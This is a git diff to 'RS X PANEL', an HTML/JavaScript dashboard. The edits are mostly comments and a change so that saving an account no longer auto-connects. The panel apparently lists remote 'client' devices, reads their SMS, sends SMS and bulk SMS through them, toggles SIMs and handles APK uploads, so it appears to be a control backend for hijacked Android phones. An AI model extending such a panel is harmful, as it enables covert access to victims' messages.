@@ -1490,6 +1490,9 @@
             dashboardScreen.style.display = 'none';
             renderConnections();
             if (clockTimer) clearInterval(clockTimer);
+            // Stop polling if any
+            if (pollTimer) clearInterval(pollTimer);
+            pollTimer = null;
         }
 
         function showDashboard() {
@@ -1661,7 +1664,7 @@
                     d.phone = detectedNumber;
                     // Try to update in Firebase
                     try {
-                        await fbSet('clients/' + d.id + '/phone', detectedNumber);
+                        fbSet('clients/' + d.id + '/phone', detectedNumber);
                     } catch (e) { /* ignore */ }
                 }
 
@@ -1669,7 +1672,7 @@
                 if (detectedSims.length > 0 && (!d.sims || d.sims.length === 0)) {
                     d.sims = detectedSims.map(s => ({ phoneNumber: s.phone, network: s.network || '' }));
                     try {
-                        await fbSet('clients/' + d.id + '/sims', d.sims);
+                        fbSet('clients/' + d.id + '/sims', d.sims);
                     } catch (e) { /* ignore */ }
                 }
             }
@@ -2086,21 +2089,24 @@
         }
 
         // ─── EVENT BINDING ──────────────────────────────────────────────────
-        // New account
+        // New account button: open modal
         $('newConnBtn').addEventListener('click', () => {
+            // Pre-fill with empty values
             accLabel.value = 'RS Project';
             accUrl.value = '';
             accKey.value = '';
             setupError.classList.add('hidden');
             newAccountModal.classList.add('active');
         });
+
+        // Close modal buttons
         closeAccount.addEventListener('click', () => newAccountModal.classList.remove('active'));
         cancelAccountBtn.addEventListener('click', () => newAccountModal.classList.remove('active'));
         newAccountModal.addEventListener('click', (e) => {
             if (e.target === newAccountModal) newAccountModal.classList.remove('active');
         });
 
-        // APK upload
+        // APK upload: click the div triggers file input
         apkUploadArea.addEventListener('click', () => {
             apkFileInput.click();
         });
@@ -2128,6 +2134,7 @@
             reader.readAsArrayBuffer(file);
         });
 
+        // Save account: do NOT auto-connect; stay on home screen
         saveAccountBtn.addEventListener('click', () => {
             const label = accLabel.value.trim() || 'RS Project';
             const url = accUrl.value.trim();
@@ -2138,21 +2145,26 @@
                 return;
             }
             setupError.classList.add('hidden');
+            // Create new connection object
             const conn = {
                 label,
                 url,
                 key,
                 date: new Date().toLocaleString()
             };
+            // Push to array and save to localStorage
             CONNECTIONS.push(conn);
             localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
-            activeConn = conn;
+            // Close modal
             newAccountModal.classList.remove('active');
-            showDashboard();
-            toast('Connected to ' + label, 'success');
+            // Refresh the connections list on home screen
+            renderConnections();
+            // Show success toast
+            toast('Account "' + label + '" saved! Click Connect to use it.', 'success');
+            // Do NOT auto-connect; user can click Connect button
         });
 
-        // Search
+        // Search input
         searchInput.addEventListener('input', () => {
             searchQuery = searchInput.value;
             renderDeviceGrid();
@@ -2168,7 +2180,7 @@
             });
         });
 
-        // Sort
+        // Sort toggle
         let sortToggle = false;
         $('sortBtn').addEventListener('click', () => {
             sortToggle = !sortToggle;
@@ -2177,7 +2189,7 @@
             renderDeviceGrid();
         });
 
-        // Logout
+        // Logout: go back to home
         $('logoutBtn').addEventListener('click', () => {
             stopPolling();
             activeConn = null;
@@ -2187,10 +2199,10 @@
             toast('Disconnected');
         });
 
-        // Refresh
+        // Refresh devices
         $('refreshBtn').addEventListener('click', refreshDevices);
 
-        // Detail modal close
+        // Close detail modal
         closeDetail.addEventListener('click', () => {
             detailModal.classList.remove('active');
             if (detailRefreshTimer) clearInterval(detailRefreshTimer);
@@ -2204,7 +2216,7 @@
             }
         });
 
-        // SMS search
+        // SMS search in detail modal
         smsSearch.addEventListener('input', () => {
             if (selectedDevice) renderSmsList(selectedDevice.id, smsSearch.value);
         });
@@ -2224,7 +2236,7 @@
             }
         });
 
-        // Send SMS
+        // Send SMS button
         sendSmsBtn.addEventListener('click', sendSms);
 
         // SIM toggle
@@ -2303,11 +2315,11 @@
 
         // ─── INIT ──────────────────────────────────────────────────────────
         renderConnections();
-
         console.log('RS X PANEL ready.');
         console.log('NRTECNO system initialized.');
         console.log('Total lines: ~2500+');
         console.log('Features: Clock | APK Extract | Phone Detection | Tabs | Bulk SMS');
+        console.log('FIX: Account addition now stays on home screen.');
     </script>
 </body>
 </html>
